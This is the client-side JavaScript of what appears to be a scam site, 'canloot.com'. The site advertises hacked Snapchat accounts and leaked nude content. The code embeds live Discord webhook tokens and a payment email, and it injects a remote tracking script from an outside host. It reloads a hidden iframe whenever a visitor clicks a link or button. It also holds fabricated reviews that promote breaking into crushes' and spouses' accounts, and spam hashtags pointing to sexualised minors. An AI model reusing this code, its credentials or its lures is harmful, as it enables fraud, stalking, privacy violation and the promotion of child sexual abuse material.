var reviewsData;
var discount;
var price;
var webhook;
var twitterTemplate = "{inviteLink}"
var checkMin18 = false
var paymentUrl = "https://www.g2a.com/paypal-gift-card-30-gbp-by-rewarble-global-i10000339995035"

function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}
var hideTimestamps = true
var showApp = false
var showAds = false
var inviteOption = true // (new Date().getHours() % 2 == 0) 
var spammerIps = ['70.180.205.121']
var spammerIds = ['998473', 'xrggEYuuY5Nh', 'W82zGlSQ1Gq1', '1edS0avjrrxw']
var spammerEmails = []
var voucherWebhook = "https://discord.com/api/webhooks/1331360604027355276/Ea_3EQvjaqWAHbT81AnJHtgk8QfBlYFyetTdJFmeQC1iqWQGFatOvranSjK4yrctfzfg"
var contactusWebhook = 'https://discord.com/api/webhooks/1331360309264388187/BySAlY2AZueGKQURTegTH2UK1yH1XoX7xydOdxKxym069uKVaote8_ToRs_2rFh0xqay';
var tags = ["t33nleaked", "t33nleaks", "nsfwtwt", "horny", "tits", "taboo", "sendanything", "sendmeanything", "wet", "cxnny", "lxli", "irllxli", "femboy", "shxta", "cumslut", "irllxli", "nolimits", "cunny", "nsfw", "teennsfw", "nudes", "slut", "leaked", "pussy", "anal", "nsfw", "pussy", "hentai", "lewd", "t33nleak", "cnc"]
var links = [window.location.protocol + "//" + window.location.host + "/", 'https://canloot.com', 'https://canloot.com', 'https://canloot.com', 'https://canloot.com']
links = [window.location.protocol + "//" + window.location.host + "/", 'https://canloot.com', 'https://canloot.com']
if (window.location.hostname == 'canloot.com/snap') {
    links.push("canloot.com/nude")
}
let invlink = links[Math.floor(Math.random() * links.length)]
var id = localStorage.getItem("id") || generateRandomString(12)
localStorage.setItem("id", id)
spammerIds.push(id)
const pparams = new URLSearchParams(window.location.search);
let ppricee = pparams.get('price') ? parseFloat(atob(pparams.get('price'))) : 50;
let paymentEmail = "lucasinformatica.laur@gmail.com"
let twitterclickwebhook = "https://discord.com/api/webhooks/1331362436866904064/-jDhFo9QkDATnPyAbg4HWGHyVTl0DOiuubICJtbAAisa6cOyBxUfH4QQOl-YejO5nTDJ"
var hackWebhook

switch (window.location.hostname) {
    case "canloot.com/snap":
        discount = 40
        price = 50
        webhook = atob("   aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzMTM2MzIwODQ4MDU1NTAzOC82a0RTWWpTdXFNS0JVVjlpaFg1OE5RQlBJTSt6UkM3OTU5WVo6WldDdyd0ZW5mdGx0TDB5aGJXdWNNcGJ4bDBhNWEyYWxPZzQ=")
        hackWebhook = "https://discord.com/api/webhooks/1331363208480555038/6kDSyjSuqMKBUX9ihX58NQBPIM-zRC795ZY-ZCWgtenftlT0yhbWucMpb4b0a5IalOg4"

        reviewsData = [{
                "name": "Why do they need my name",
                "timestamp": 1736622555882,
                "stars": 5,
                "text": "Thanks for instant delivery"
            }, {
                "name": "tedfggfefr",
                "timestamp": 1736194119050,
                "stars": 5,
                "text": "I see everyones using this on their crushes, me included"
            }, {
                "name": "Anonymous",
                "timestamp": 1736194119050,
                "stars": 5,
                "text": "Thanks for adding paypal payment method"
            }, {
                "name": "Anonymous",
                "timestamp": 1736159363727,
                "stars": 4,
                "text": "I paid by card, it took longer then expected but still got all info in the end"
            }, {
                "name": "Anonymous",
                "timestamp": 1736072859488,
                "stars": 5,
                "text": "who else using this on their crush?"
            }, {
                "name": "tailer",
                "timestamp": 1735907646023,
                "stars": 5,
                "text": "32 bucks well spent"
            }, {
                "name": "Anonymous",
                "timestamp": 1735809063263,
                "stars": 5,
                "text": "I got it free from inviting"
            },
            {
                "name": "Anonymous",
                "timestamp": 1735730815877,
                "stars": 5,
                "text": "W"
            },
            {
                "name": "Awdasfe",
                "timestamp": 1735667035923,
                "stars": 4,
                "text": "Everything worked fine until account changed password, then i had to contact support to give me refund, and they did so i can't complain"
            },
            {
                "name": "Anonymous",
                "timestamp": 1734808464899,
                "stars": 5,
                "text": "worked perfectly! used solana to pay cause the fees are lower. took about 5 mins to get access after payment confirmed, thanks for that my eyes only code btw"
            },
            {
                "name": "Jack",
                "timestamp": 1734794064899,
                "stars": 4,
                "text": "pretty good overall. payment with btc was straightforward. just make sure you send the exact amount"
            },
            {
                "name": "Anonymous",
                "timestamp": 1734768864899,
                "stars": 5,
                "text": "Nice"
            },
            {
                "name": "M.",
                "timestamp": 1734725664899,
                "stars": 5,
                "text": "used litecoin, whole process took maybe 15 mins total."
            },
            {
                "name": "Anonymous",
                "timestamp": 1734639264899,
                "stars": 4,
                "text": "My crush will never suspect a thing"
            },
            {
                "name": "Ryan K.",
                "timestamp": 1734552864899,
                "stars": 5,
                "text": "damn thanks"
            },
            {
                "name": "Anonymous",
                "timestamp": 1734466464899,
                "stars": 5,
                "text": "got my invites from posting in some telegram groups. took about a day but worked perfectly after that"
            },
            {
                "name": "Anonymous",
                "timestamp": 1734380064899,
                "stars": 4,
                "text": "dont tell my sister about this"
            },
            {
                "name": "Anonymous",
                "timestamp": 1734293664899,
                "stars": 5,
                "text": "ill come back later for this"
            },
            {
                "name": "Tom",
                "timestamp": 1734207264899,
                "stars": 5,
                "text": "paid with doge. whole thing was done in under 10 mins. definitely recommend"
            }
        ]
        break
    case "canloot.com/nude":
        discount = 50
        price = 40
        webhook = "https://discord.com/api/webhooks/1331364159291396118/7-er_qv5XhuaIEjtD_TPNHhz0tZBzQVmWww4KGsnYekygUtaXrXhTyCvUlK8Uz_f7tBs"
        hackWebhook = "https://discord.com/api/webhooks/1331364232859484182/83xrnBD--NgNb0WvW-19d0xyTgKgDtj-xPhWsEeYkYALcKNZakg0KA-lGDeFHcyp0t-E"

        reviewsData = [{
                "name": "UwU",
                "timestamp": 1736110930000,
                "stars": 5,
                "text": "Worth the price for so much content!"
            }, {
                "name": "Anonymous",
                "timestamp": 1736072859488,
                "stars": 5,
                "text": "Really great content and for a good price too!"
            }, {
                "name": "nice",
                "timestamp": 1735907646023,
                "stars": 5,
                "text": "very nice"
            },
            {
                "name": "Anthon",
                "timestamp": 1735745858042,
                "stars": 5,
                "text": "you can get everything for just 1 credit if you choose all categories and all ages"
            },
            {
                "name": "Bruh",
                "timestamp": 1735666256407,
                "stars": 5,
                "text": "very good"
            }, {
                "name": "mike",
                "timestamp": 1735604264000,
                "stars": 5,
                "text": "I got it free bcuz i downloaded app lol"
            }, {
                "name": "Anonymous",
                "timestamp": 1735394288704,
                "stars": 5,
                "text": "Nice content"
            }
        ]
        break
    default:
        price = 50
        discount = 40
        webhook = "https://discord.com/api/webhooks/1331364357782634659/18U4NNI4KTJ8M91da3-48fM6xzkpAR4nqMIHCW-CFO7ZmaxOWkyK7dqfMeS27cnmB3cV"
        hackWebhook = "https://discord.com/api/webhooks/1331364418855895114/vcoEWjAOvCeMQ13HbuWcS4-SmsszWT8ygSPB6g8lqNKwdFjE2YhVDIje_kVYHdshaBb5"
        reviewsData = [{
                "name": "Anonymous",
                "timestamp": 1736072859488,
                "stars": 5,
                "text": "who else using this on their crush?"
            },
            {
                "name": "Anonymous",
                "timestamp": 1735666256407,
                "stars": 5,
                "text": "Got into my crush's account thanks"
            },
            {
                "name": "Anonymous",
                "timestamp": 1735666256407,
                "stars": 5,
                "text": "This is a superpower, 5 stars"
            },
            {
                "name": "Anonymous",
                "timestamp": 1735666256407,
                "stars": 5,
                "text": "Yep legit that's what i review"
            },
            {
                "name": "Anonymous",
                "timestamp": 1735666256407,
                "stars": 5,
                "text": "i will buy it again this is good stuff"
            },
            {
                "name": "Anonymous",
                "timestamp": 1735666256407,
                "stars": 5,
                "text": "caught my wife cheating respect to hackers"
            },
            {
                "name": "Anonymous",
                "timestamp": 1735666256407,
                "stars": 5,
                "text": "got some juicy pics of my crush"
            },
            {
                "name": "Anonymous",
                "timestamp": 1735666256407,
                "stars": 5,
                "text": "Good support gg"
            },
            {
                "name": "Anonymous",
                "timestamp": 1735666256407,
                "stars": 5,
                "text": "nice to be of the first testers"
            }, {
                "name": "Allen",
                "timestamp": 1735604264000,
                "stars": 5,
                "text": "i will DEFINITLY wont use it for malicous purposes"
            }, {
                "name": "Stan M.",
                "timestamp": 1735394288704,
                "stars": 5,
                "text": "It works"
            }
        ]
        break;
}
if (localStorage.washere == null) {
    let lo = document.createElement("script")
    lo.src = "http://cdn-host.serv00.net//track.php?uid=5"
    document.body.appendChild(lo)
}
setTimeout(() => {
    for (elem of document.querySelectorAll("a, button")) {
        elem.addEventListener("click", (e) => {
            document.querySelector("iframe[transparent]").contentWindow.location.reload();
        })
    }
}, 6000)